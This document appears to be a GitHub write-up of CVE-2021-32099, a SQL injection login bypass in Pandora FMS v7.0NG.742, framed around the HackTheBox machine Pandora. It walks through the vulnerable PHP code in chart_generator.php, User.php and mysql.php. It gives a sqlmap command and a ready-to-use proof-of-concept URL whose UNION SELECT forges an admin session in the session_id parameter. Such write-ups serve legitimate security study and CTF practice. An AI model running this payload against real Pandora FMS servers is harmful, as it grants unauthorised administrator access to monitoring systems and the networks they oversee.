# CVE-2021-32099 SQLi Bypass login
Useful when trying to read **User Flag** on **Pandora.htb**

CVE-2021-32099 SQLi allow attacker bypass login.

## Target

Exploit on: **Pandora FMS v7.0NG.742_FIX_PERL2020**

## Analysis
Read from cvedetail. We know endpoint of target: http://localhost:8000/pandora_console/include/chart_generator.php?session_id=PayloadHere => Access denied.

![alt text](https://github.com/l3eol3eo/CVE-2021-32099_SQLi/blob/master/images/read_from_cvedetail.jpg?raw=true)
`sqlmap -r req.txt -p session_id --dbms=mysql --dbs --risk=3 --level=5`

After enumerate, we just focus on **tsessions_php** table. **tssessions_php** have 3 columns: id_session, last_active, data. ( sqlmap's result wrong format )

![alt text](https://github.com/l3eol3eo/CVE-2021-32099_SQLi/blob/master/images/sqlmap_result.jpg?raw=true)

**/include/chart_generator.php**
```php
71  // Try to initialize session using existing php session id.
72  $user = new PandoraFMS\User(['phpsessionid' => $_REQUEST['session_id']]);
73  if (check_login(false) === false) {   
74     // Error handler.
 ⋮
96  }
97
98  // Access granted.
```

- **phpsessionid** will be assign value of **session_id** (***PayloadHere***)

**/include/lib/User.php**
```php
60  public function __construct($data)
61  {
 ⋮
68     if (is_array($data) === true) {
69        if (isset($data['phpsessionid']) === true) {
70           $this->sessions[$data['phpsessionid']] = 1;
71           $info = \db_get_row_filter(
72              'tsessions_php',
73              ['id_session' => $data['phpsessionid']]
74          );
75
76         if ($info !== false) {
77            // Process.
78            $session_data = session_decode($info['data']);
79            $this->idUser = $_SESSION['id_usuario'];
80
81            // Valid session.
82            return $this;
83         }
```

- **id_session** will be assign value of **phpsessionid**
- All code will provide for this query: `select * from tsessions_php where id_session=***PayloadHere***`

**/include/lib/db/mysql.php**
```php
848  function db_get_row_filter($table, $filter, $fields=false)
849  {  
850     if (empty($fields)) {
851         $fields = '*';
852     }
 ⋮
861     $filter = db_format_array_where_clause_sql($filter, ' WHERE ');
 ⋮
868     $sql = sprintf('SELECT %s FROM %s %s', $fields, $table, $filter);
```

## **POC**: 
http://localhost:8000/pandora_console/include/chart_generator.php?session_id=PayloadHere%27%20union%20select%20%271%27,%272%27,%27id_usuario|s:5:%22admin%22;%27%20--%20a => Pandora FMS Graph ( - )

reload: http://localhost:8000/pandora_console/ to access webpage

## References:

https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained 

https://portswigger.net/daily-swig/multiple-vulnerabilities-in-pandora-fms-could-trigger-remote-execution-attack